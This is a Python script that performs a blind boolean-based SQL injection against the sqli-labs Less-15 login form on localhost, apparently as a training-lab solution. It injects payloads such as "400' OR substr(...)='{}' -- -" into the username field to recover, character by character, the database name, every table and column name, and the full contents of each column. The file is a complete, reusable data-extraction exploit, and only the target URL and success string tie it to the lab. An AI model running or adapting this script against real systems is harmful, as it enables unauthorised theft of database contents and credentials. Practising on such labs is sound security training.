import requests
import string

METHOD = 'POST'
BASE_PATH = "http://localhost/sqli-labs-php7/Less-15/"

chars = list(string.printable) + [' ']
chars.remove('#')
key = 'You are in'
#key = 'flag'

def bruteforceLength(query):
    j = 0
    while True:
        if METHOD=='GET':
            r = requests.get(BASE_PATH + query.format(j))
        else:
            obj = {'uname': query.format(j), 'passwd':'admin', 'submit':'Submit'}
            r = requests.post(BASE_PATH, data=obj)
            #print (r.content)
        #print (BASE_PATH + query.format(j))
        if key in r.content.decode('utf-8'):
            #print ("Length is ", j)    
            print ("    [+] LENGTH: ", j)
            return j
        j+=1

def bruteforceChars(query, maxLen):
    found = ""
    for i in range(1, maxLen+1):
        for ch in chars:
            if METHOD=='GET':
                r = requests.get(BASE_PATH + query.format(i, found+ch))
            else:
                obj = {'uname':query.format(i, found+ch), 'passwd':'blank', 'submit':'Submit'}
                r = requests.post(BASE_PATH, data=obj)
            
            if key in r.content.decode('utf-8'):
                found+=ch 
                break 
    return found

def queryBuilder(columnName, fromTable, condition='', type='LEN'):
        if type=='LEN':
            query = "400' OR length((SELECT GROUP_CONCAT("+ columnName +") from "+ fromTable
            if condition!='':
                query+= " where "+ condition
            query += "))={} -- -; "
        else:
            query = "400' OR substr((SELECT GROUP_CONCAT("+ columnName +") from "+ fromTable 
            if condition!='':
                query+=" where " + condition
            query += "),1,{})='{}' -- -; "
        return query
        
def getDatabase():
    # DATABASE:
    # NO QUERY USED

    database = bruteforceChars("400' or substr(database(),1,{}) ='{}' -- -" , 8)
    return database

def getTables():
    query = queryBuilder('table_name', 'information_schema.tables' , 'table_schema=database()')
    length = bruteforceLength(query)

    query = queryBuilder("table_name", "information_schema.tables", "table_schema=database()", 'substr')
    tables = bruteforceChars(query, length)
    tables = tables.split(',')
    return tables

def getColumns(table):
    query = queryBuilder('column_name', 'information_schema.columns', "columns.table_schema=database() and columns.table_name='"+ table +"'" )
    colLength = bruteforceLength(query)

    query = queryBuilder('column_name', 'information_schema.columns', "table_schema=database() and table_name='"+table+"'", 'substr')
    cols = bruteforceChars(query, colLength).split(',')
    return (cols)

def getColumnData(table, columnName):
    query = queryBuilder(columnName, table)
    #query = "400' OR length((SELECT GROUP_CONCAT("+columnName+") FROM "+table+"))={} -- -"
    dataLength = bruteforceLength(query)

    query = queryBuilder(columnName, table, '', 'substr')
    #query = "400' OR SUBSTR((SELECT GROUP_CONCAT("+columnName+") FROM "+table+"),1,{})='{}' -- -"
    data = bruteforceChars(query, dataLength)
    return (data.split(','))
    
def main():
    print ("[+] ENUMERATING DATABASE: ", getDatabase() )
    tables = getTables()

    for table in tables:
        print ("[+] CURRENT TABLE: ", table)
        columns = getColumns(table)

        print ("[+] COLUMNS: ", columns)
        
        data = []
        for column in columns:
            print ("[+] TABLE : ", table)
            print ("[+] COLUMN: ", column)
            colData = getColumnData(table, column)
            for data in colData:
                print (data, end=',')
            print()
            print ("-"*80)
        print ("="*80)
          
print(main())
